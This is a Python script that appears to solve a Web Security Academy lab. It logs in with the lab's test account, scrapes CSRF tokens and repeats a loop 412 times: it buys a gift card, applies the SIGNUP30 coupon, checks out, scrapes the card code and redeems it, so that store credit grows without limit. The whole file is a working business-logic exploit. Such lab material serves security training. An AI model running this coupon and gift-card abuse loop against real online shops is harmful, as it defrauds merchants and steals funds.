#!/usr/bin/env python
import requests
from bs4 import BeautifulSoup


BASEURL = "https://ac8a1f631ff6c0108058579b009900e0.web-security-academy.net/"
cred = {
        'username': 'wiener',
        'password': 'peter',
    }

# Get csrf token
def getCsrfToken(s, endpoint):
    r = s.get(BASEURL + endpoint)
    soup = BeautifulSoup(r.text, 'lxml')

    csrfToken = soup.find('input', attrs={'name':'csrf'})['value']
    return csrfToken    

if __name__=="__main__":
    s = requests.Session()
    csrfToken = getCsrfToken(s, "login")
    cred['csrf'] = csrfToken

    # Login 
    r = s.post(url = BASEURL + "login", data = cred)
    c = r.cookies
    for cookie in c:
        print('%s: %s'%(cookie.name, cookie.value))

    for i in range(412):
        # Buy Product 2
        data = {
            'productId':'2',
            'redir':'PRODUCT',
            'quantity':'1'
        }

        r = s.post(url = BASEURL + "cart", data = data)

        # Enter Coupon
        csrfToken = getCsrfToken(s, "cart")
        data = {
            'coupon': 'SIGNUP30',
            'csrf': csrfToken
        }
        r = s.post(url = BASEURL + "cart/coupon", data = data)

        csrfToken = getCsrfToken(s, "cart")
        data = {
            'csrf':csrfToken
        }
        r = s.post(url = BASEURL + "cart/checkout", data = data)

        # Get Code
        soup = BeautifulSoup(r.text, 'lxml')
        code = soup.find('table', attrs={'class':'is-table-numbers'}).find('td').get_text()
        #print code
        
        # POST gift cart
        csrfToken = getCsrfToken(s, "my-account?id=wiener")
        data = {
            'gift-card':code,
            'csrf':csrfToken
        }
        r = s.post(url = BASEURL + "gift-card", data = data, allow_redirects = True)
        soup = BeautifulSoup(r.text, 'lxml')
        storeCredit = soup.find('header', attrs={'class':'navigation-header'}).find('strong').get_text()
        print storeCredit
